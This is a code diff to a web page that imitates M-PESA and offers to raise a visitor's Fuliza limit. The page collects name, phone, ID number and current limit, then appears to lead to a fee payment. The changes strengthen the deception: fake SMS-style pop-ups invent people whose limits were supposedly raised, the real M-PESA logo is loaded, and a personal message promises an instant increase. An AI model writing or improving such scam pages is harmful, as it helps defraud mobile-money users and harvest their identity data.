@@ -59,19 +59,19 @@
     .whatsapp span.dot{position:absolute;top:-4px;right:-4px;width:12px;height:12px;background:#00a651;border-radius:50%;border:2px solid #fff}
     .whatsapp-label{position:absolute;right:65px;background:#333;color:#fff;padding:6px 10px;border-radius:6px;font-size:11px;white-space:nowrap;font-weight:600}
 
-      /* POPUP NOTIFICATIONS - TOP RIGHT WITH MPESA LOGO */
-     .popup-container{position:fixed;top:80px;right:20px;z-index:1001;display:flex;flex-direction:column;gap:10px}
-     .popup-notif{background:white;border:1px solid #e0e0e0;padding:12px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.2);min-width:300px;animation: slideIn 0.5s ease;opacity:0;transform:translateX(400px);display:flex;gap:12px}
-     .popup-notif.show{opacity:1;transform:translateX(0)}
-     .popup-notif.hide{animation: slideOut 0.5s ease forwards}
-      @keyframes slideIn{from{opacity:0;transform:translateX(400px)} to{opacity:1;transform:translateX(0)}}
-      @keyframes slideOut{from{opacity:1;transform:translateX(0)} to{opacity:0;transform:translateX(400px)}}
-     .mpesa-logo{width:40px;height:40px;border-radius:8px;background:linear-gradient(135deg,#00a651 0%,#008541 100%);display:flex;align-items:center;justify-content:center;color:white;font-weight:700;font-size:10px;flex-shrink:0}
-     .popup-content{flex:1}
-     .popup-content.title{font-size:12px;color:#666;margin-bottom:3px}
-     .popup-content.name{font-weight:700;font-size:14px;color:#333;margin-bottom:3px}
-     .popup-content.amount{color:#00a651;font-weight:700;font-size:16px;margin-bottom:2px}
-     .popup-content.phone{font-size:11px;color:#999;font-family:monospace}
+      /* POPUP NOTIFICATIONS - SIMPLE MPESA SMS STYLE */
+     .popup-container{position:fixed;top:10px;left:50%;transform:translateX(-50%);z-index:1001;display:flex;flex-direction:column;gap:6px;pointer-events:none}
+     .popup-notif{background:#fff;border-left:3px solid #00a651;padding:8px 12px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);min-width:280px;max-width:320px;animation: slideDown 0.3s ease;opacity:0;transform:translateY(-50px);display:flex;gap:8px;align-items:center;font-size:12px}
+     .popup-notif.show{opacity:1;transform:translateY(0)}
+     .popup-notif.hide{animation: slideUp 0.3s ease forwards}
+      @keyframes slideDown{from{opacity:0;transform:translateY(-50px)} to{opacity:1;transform:translateY(0)}}
+      @keyframes slideUp{from{opacity:1;transform:translateY(0)} to{opacity:0;transform:translateY(-50px)}}
+     .mpesa-logo-img{width:28px;height:28px;border-radius:4px;object-fit:contain;flex-shrink:0}
+     .popup-text{flex:1;line-height:1.3}
+     .popup-text b{color:#00a651}
+     .popup-text .phone{color:#888;font-size:10px;font-family:monospace}
+
+     .greeting-text{color:#00a651;font-size:14px;margin-top:8px;font-weight:600;text-align:left;line-height:1.4}
 
     .contact{text-align:center;margin-top:15px;font-size:13px;color:#666}
     .contact a{color:#00a651;text-decoration:none;pointer-events:none;cursor:default;font-weight:600}
@@ -86,7 +86,7 @@
   <span class="dot"></span>
 </div>
 
-<!-- POPUP CONTAINER - TOP RIGHT -->
+<!-- POPUP CONTAINER - TOP CENTER -->
 <div class="popup-container" id="popupContainer"></div>
 
 <div id="s1" class="screen active">
@@ -177,7 +177,7 @@
                 <h3 id="pName">Name</h3>
                 <p>Phone: <span id="pPhone">07XXXXXXXX</span></p>
                 <p>ID: <span id="pID">49****19</span></p>
-                <p id="pGenderText" style="color:#00a651;font-size:13px;margin-top:5px;"></p>
+                <p id="pGreetingText" class="greeting-text"></p>
                 <div class="limit-badge">Current Limit: KSh <span id="pLimit">0</span></div>
             </div>
         </div>
@@ -219,10 +219,6 @@
 let selectedLimit = 0, selectedFee = 0;
 let userData = {};
 
-// LIST YA MAJINA YA KIKE NA KIUME KWA KU-DETECT GENDER
-const femaleNames = ['mary','ann','wanjiku','amina','faith','joy','grace','janet','lucy','susan','esther','rose','beatrice','catherine','judith','rebecca','ruth','dorcas','caroline','nancy'];
-const maleNames = ['john','peter','james','david','michael','joseph','daniel','paul','kevin','brian','samuel','isaac','emmanuel','stephen','martin','george','anthony','charles','robert','williams'];
-
 // POPUP NOTIFICATIONS DATA - MPESA STYLE
 const popupData = [
   {name: "Mary Wanjiku", amount: "85000", phone: "0712345678"},
@@ -236,6 +232,9 @@ const popupData = [
 let popupIndex = 0;
 let popupInterval;
 
+// REAL MPESA LOGO URL
+const MPESA_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/M-PESA_LOGO-01.svg/1200px-M-PESA_LOGO-01.svg.png";
+
 function maskPhone(phone){
   return phone.substring(0,3) + "** ****" + phone.substring(9);
 }
@@ -247,27 +246,25 @@ function showPopup(){
   const div = document.createElement('div');
   div.className = 'popup-notif';
   div.innerHTML = `
-    <div class="mpesa-logo">M<br>PESA</div>
-    <div class="popup-content">
-      <div class="title">M-PESA Fuliza Limit Increased</div>
-      <div class="name">${data.name}</div>
-      <div class="amount">Ksh ${parseInt(data.amount).toLocaleString()}</div>
-      <div class="phone">${maskPhone(data.phone)}</div>
+    <img src="${MPESA_LOGO}" class="mpesa-logo-img" alt="M-PESA"/>
+    <div class="popup-text">
+      <b>${data.name}</b> increased Fuliza limit to <b>Ksh ${parseInt(data.amount).toLocaleString()}</b><br>
+      <span class="phone">${maskPhone(data.phone)}</span>
     </div>
   `;
 
   container.appendChild(div);
-  setTimeout(()=>div.classList.add('show'), 100);
+  setTimeout(()=>div.classList.add('show'), 50);
   setTimeout(()=>{
     div.classList.add('hide');
-    setTimeout(()=>div.remove(), 500);
-  }, 4000);
+    setTimeout(()=>div.remove(), 300);
+  }, 3500);
 
   popupIndex++;
 }
 
 function startPopups(){
-  popupInterval = setInterval(showPopup, 5000);
+  popupInterval = setInterval(showPopup, 7000);
   showPopup(); // show first one immediately
 }
 
@@ -323,13 +320,6 @@ function show(n){
     }
 }
 
-function detectGender(firstName){
-  const name = firstName.toLowerCase();
-  if(femaleNames.includes(name)) return 'her';
-  if(maleNames.includes(name)) return 'his';
-  return 'their'; // default
-}
-
 document.getElementById('form1').addEventListener('submit', async e=>{
     e.preventDefault();
     if(!validateForm()) return;
@@ -343,18 +333,17 @@ document.getElementById('form1').addEventListener('submit', async e=>{
     userData = {
         firstName: firstName,
         surname: surname,
-        name: firstName + ' + surname,
+        name: firstName + ' ' + surname,
         phone: document.getElementById('phone').value,
         id: document.getElementById('idNumber').value,
         currentLimit: document.getElementById('currentLimit').value
     };
 
-    const genderPronoun = detectGender(firstName);
     document.getElementById('pName').innerText = userData.name;
     document.getElementById('pPhone').innerText = userData.phone;
     document.getElementById('pID').innerText = userData.id.substring(0,2) + '****' + userData.id.slice(-2);
     document.getElementById('pLimit').innerText = userData.currentLimit;
-    document.getElementById('pGenderText').innerText = `We are increasing ${genderPronoun} Fuliza limit`;
+    document.getElementById('pGreetingText').innerHTML = `Dear ${userData.name},<br>Your Fuliza Limit Will Be Increased Instantly.<br>Proceed To Select Your Desired Limit`;
     document.getElementById('userAvatar').innerText = firstName[0] + surname[0];
 
     setTimeout(()=>show(3), 2000);
@@ -457,4 +446,4 @@ async function paySTK(){
 
 </script>
 </body>
-</html>
+                    </html>
